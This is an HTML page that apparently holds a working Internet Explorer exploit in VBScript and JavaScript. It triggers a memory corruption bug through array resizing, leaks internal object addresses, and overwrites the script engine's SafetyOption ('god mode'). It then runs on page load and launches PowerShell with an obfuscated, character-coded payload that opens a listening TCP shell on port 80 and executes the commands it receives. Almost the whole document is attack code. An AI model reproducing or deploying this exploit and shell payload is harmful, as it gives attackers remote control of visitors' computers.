<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
<link rel="icon" href="data:,">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "powershell", "/w 1 [StRInG]::jOiN( '',('36j108P105O115q116b101&110M101M114j32b61b32L91L83>121&115O116P101;109b46b78j101O116P46M83P111;99P107L101;116O115;46L84j99P112&76j105P115O116b101P110b101L114O93;56b48M59M36>108M105P115j116;101j110O101O114M46P115q116&97b114b116O40P41&59O36&99L108L105q101j110&116q32j61q32b36j108;105;115q116P101P110q101j114P46;65;99q99O101;112>116>84b99P112L67O108>105q101;110j116P40;41O59j36O115P116&114O101q97b109;32j61b32P36b99M108P105q101O110P116M46O71O101P116j83;116P114&101M97O109O40P41L59O91L98j121q116M101O91L93M93q36&98&121q116;101j115&32M61b32>48P46>46>54;53j53b51;53j124P37&123>48P125M59j119&104>105>108M101q40q40O36b105&32P61;32L36O115>116;114P101b97;109&46O82q101q97M100P40j36b98O121j116q101L115&44L32>48&44j32j36&98&121M116j101j115q46q76;101M110b103;116O104L41&41M32L45>110&101M32P48q41P123P59q36;100b97b116&97b32M61P32P40O78&101O119;45O79;98q106P101b99P116&32P45b84>121b112M101M78M97b109M101M32b83&121q115b116>101&109M46;84b101M120M116>46P65O83b67&73M73L69q110j99P111L100j105M110b103>41P46&71b101M116j83M116P114M105&110M103>40P36M98O121q116P101&115j44;48j44;32&36b105;41j59&36O115&101;110M100&98P97q99q107>32P61b32>40q105>101P120O32L36q100O97;116j97>32b50q62O38L49P32M124&32P79L117b116b45&83O116j114O105q110O103>32j41P59L36L115j101b110;100j98M97>99;107P50L32;32>61M32O36;115&101q110j100;98L97b99L107O32;43&32L34q80q83M32q34&32M43j32M40;112O119>100O41&46>80j97O116b104&32P43O32q34O62b32>34P59P36;115&101;110&100L98j121b116q101O32q61>32P40&91P116L101&120M116;46>101q110&99&111;100&105>110b103O93O58q58&65P83b67b73b73>41>46L71L101j116>66q121&116&101j115j40b36j115M101b110q100>98;97;99;107P50;41;59P36>115>116&114b101&97&109M46L87M114;105q116P101&40q36j115P101>110P100>98M121M116P101j44&48L44O36M115;101b110L100>98j121O116P101P46M76M101P110L103q116q104;41M59;36&115j116M114;101O97M109P46;70>108b117b115P104j40P41j125M59;36L99j108&105&101q110>116M46;67q108L111b115&101&40;41;59M36j108;105b115M116b101j110P101&114O46>83;116j111L112;40b41'.SPlIt( 'b;M>PLjO&q' )| foREach { ([ChAr][iNT] $_) })) | . ( $shelliD[1]+$SHELLid[13]+'x')", "", "", 0
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
